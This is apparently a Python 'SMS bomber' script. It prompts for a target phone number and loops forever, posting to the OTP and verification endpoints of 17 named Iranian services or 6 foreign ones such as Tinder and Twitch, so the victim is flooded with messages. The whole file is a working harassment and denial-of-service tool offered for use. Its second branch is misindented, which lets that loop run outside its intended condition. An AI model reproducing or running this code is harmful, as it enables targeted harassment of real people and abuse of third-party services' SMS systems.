
banner = """

               ___________________________________ 
              | created by:                       |
              |       mohammad30666               |
              |                                   |
              |                                   |
              |   my github:                      |
              | https://github.com/mohammad30666  |
              |___________________________________|
"""




import requests, random, datetime, sys, time, argparse
print(banner)

print ("my discord id mohammad30666#0719 ")

t = input ('1_For Iran\n2_Other countries\n>>> ')

if t == "1":
    target = input ('target phone number >>> ')

    url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'

    url2 = 'https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=214fa3b6-6cd8-4e66-965a-e958edd1c576&locale=fa'

    url3 = 'https://core.gap.im/v1/user/add.json?mobile=%'

    url4 = 'https://nobat.ir/api/public/patient/login/phone'

    url5 = 'https://api.divar.ir/v5/auth/authenticate'

    url6 = 'https://drdr.ir/api/registerEnrollment/verifyMobile'

    url7 = 'https://www.tebinja.com/api/v1/users'

    url8 = 'https://www.tabibyab.com/api/sendVerificationCode'

    url9 = 'https://api.tapsi.cab/api/v2/user'

    url10 = 'https://api.visit24.ir/user/login'

    url11 = 'https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest'

    url12 = 'https://api.digikala.com/v1/user/authenticate/'

    url13 = 'https://myzel.ir/auth/login'

    url14 = 'https://www.delino.com/user/register'

    url15 = 'https://mamifood.org/Registration.aspx/IsUserAvailable'

    url16 = 'https://atawich.com/Account/FoodPhoneNumberVerification/?lazyLoad=true&btnID=undefined'

    url17 = 'https://www.hamrah-mechanic.com/api/v1/auth/login'

    while True:
        time.sleep(1)
        pyload =  {"cellphone": target }
        p = requests.post(url, data=pyload)
        print('sendd')
        pyload2 =  {"cellphone": target }
        p = requests.post(url2, data=pyload2)
        print('sendd')
        pyload3 =  {"mobile": target}
        p = requests.post(url3, data=pyload3)
        print('sendd')
        pyload4 =  {"mobile": target}
        p = requests.post(url4, data=pyload4)
        print('sendd')
        pyload5 =  {"phone": target}
        p = requests.post(url5, data=pyload5)
        print('sendd')
        pyload6 = {"phonenumber": target}
        p = requests.post(url6, data=pyload6)
        print('sendd')
        pyload7 = {"username": target} 
        p = requests.post(url7, data=pyload7)
        print('send')
        pyload8 = {"phone": target}
        p = requests.post(url8, data=pyload8)
        print('sendd')
        pyload9 = {"phonenumber": target}
        p = requests.post(url9, data=pyload9)
        print('sendd')
        pyload10 = {"mobile": target }
        p = requests.post(url10, data=pyload10)
        print('sendd')
        pyload11 = {"mobile": target }
        p = requests.post(url11, data=pyload11)
        print('sendd')
        pyload12 = {"username": target }
        p = requests.post(url12, data=pyload12)
        print('sendd')
        pyload13 = {"cell": target }
        p = requests.post(url13, data=pyload13)
        print('sendd')
        pyload14 = {"mobile": target }
        p = requests.post(url14, data=pyload14)
        print('sendd')
        pyload15 = {"cellphone": target }
        p = requests.post(url15, data=pyload15)
        print('sendd')
        pyload16 = {"PhoneNumber": target }
        p = requests.post(url16, data=pyload16)
        print('sendd')
        pyload17 = {"phoneNumber": target }
        p = requests.post(url17, data=pyload17)
        print('sendd') 


if t == "2":
    phone = input('target phone number >>> ')
    _name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

urlq = 'https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru'
urlw = 'https://lenta.com/api/v1/authentication/requestValidationCode'
urle = 'https://ube.pmsm.org.ru/esb/iqos-phone/validate'
urlr = 'https://passport.twitch.tv/register?trusted_request=true'
urlt = 'https://api-prime.anytime.global/api/v2/auth/sendVerificationCode'
urly = 'https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru'
while True:
    pyloadq = {"phone_number": phone }
    b = requests.post(urlq, data=pyloadq)
    print('sendd') 
    pyloadw = {"phone": phone }
    b = requests.post(urlw, data=pyloadw)
    print('sendd') 
    pyloade = {"phone": phone }
    b = requests.post(urle, data=pyloade)
    print('sendd') 
    pyloadr = {"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": phone,"username": username}
    b = requests.post(urlr, data=pyloadr)
    print('sendd') 
    pyloadt = {"phone": phone }
    b = requests.post(urlt, data=pyloadt)
    print('sendd') 
    pyloady = {"phone": phone }
    b = requests.post(urly, data=pyloady)
    print('sendd') 

